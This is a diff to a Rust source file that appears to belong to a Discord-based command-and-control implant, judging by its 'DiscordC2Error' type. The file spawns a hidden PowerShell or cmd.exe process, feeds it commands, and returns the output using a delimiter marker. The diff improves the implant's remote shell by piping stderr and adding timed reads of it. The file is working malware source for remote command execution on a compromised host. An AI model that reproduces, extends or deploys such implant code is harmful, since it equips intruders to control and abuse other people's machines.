@@ -2,10 +2,11 @@ use std::process::Stdio;
 use tokio::io::{AsyncWriteExt, BufReader};
 use tokio::process::{Child, Command};
 use std::sync::Arc;
-use tokio::sync::{Mutex};
+use tokio::sync::Mutex;
 use crate::errors::DiscordC2Error;
 use lazy_static::lazy_static;
 use tokio::io::AsyncBufReadExt;
+use tokio::time::{timeout, Duration};
 
 #[derive(Clone, PartialEq, Eq, Debug, Copy)]
 pub enum ShellType {
@@ -14,7 +15,7 @@ pub enum ShellType {
 }
 
 impl ShellType {
-    pub fn from_str(s: &str) -> Result<ShellType, DiscordC2Error> {
+    pub fn _from_str(s: &str) -> Result<ShellType, DiscordC2Error> {
         match s {
             "powershell.exe" => Ok(ShellType::Powershell),
             "cmd.exe" => Ok(ShellType::Cmd),
@@ -91,21 +92,54 @@ impl ProcessHandler {
     pub async fn run_command(&self, command: &str) -> Result<String, DiscordC2Error> {
         // Call the proper stdin function depending on the shell type
         self.shell_type.handle_stdin(self, command).await?;
+        let mut output = String::new();
 
-        // Lock the process so we can read the output
+
+        async fn read_stderr(process: Arc<Mutex<Child>>) -> Option<String> {
+            let mut process = process.lock().await;
+            let stderr_reader = BufReader::new(process.stderr.as_mut().unwrap());
+            let mut err_lines = stderr_reader.lines();
+            let mut output = String::new();
+            loop {
+                match timeout(Duration::from_millis(10), err_lines.next_line()).await {
+                    Ok(line_result) => match line_result {
+                        Ok(Some(line)) => {
+                            if !line.is_empty() {
+                                eprintln!("stderr: {}", line);
+                                output.push_str(&line);
+                                output.push('\n');
+                            }
+                        }
+                        Ok(None) => {
+                            eprintln!("Stopped reading stderr");
+                            break;
+                        }
+                        Err(e) => {
+                            eprintln!("Error reading stderr: {}", e);
+                            break;
+                        }
+                    },
+                    Err(_) => {
+                        eprintln!("Timeout while reading stderr");
+                        break;
+                    }
+                }
+            }
+
+            if !output.is_empty() {
+                Some(output)
+            } else {
+                None
+            }
+        }
+
+        let stderr = read_stderr(Arc::clone(&self.process)).await;
+        println!("stderr: {:?}", stderr);
+
         let mut process = self.process.lock().await;
-
         // Read the process's stdout line by line
         let stdout_reader = BufReader::new( process.stdout.as_mut().unwrap());
         let mut out_lines = stdout_reader.lines();
-
-        let mut process = self.process.lock().await;
-
-        let stderr_reader = BufReader::new( process.stderr.as_mut().unwrap());
-        let mut err_lines = stderr_reader.lines();
-
-        let mut output = String::new();
-
         while let Some(line) = out_lines.next_line().await? {
             if !line.contains("echo") && line.contains("___CMDDELIM___") {
                 break;
@@ -113,12 +147,6 @@ impl ProcessHandler {
             output.push_str(&line);
             output.push('\n');
         }
-
-        while let Some(line) = err_lines.next_line().await? {
-            output.push_str(&line);
-            output.push('\n');
-        }
-
 
         let formatted_output = self.shell_type.format_output(&output);
 
@@ -155,6 +183,7 @@ async fn open_shell(shell_type: ShellType) -> Result<tokio::process::Child, Disc
     let child = Command::new(shell_type.as_str())
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
         .spawn()
         .map_err(|e| DiscordC2Error::from(e))?;
 
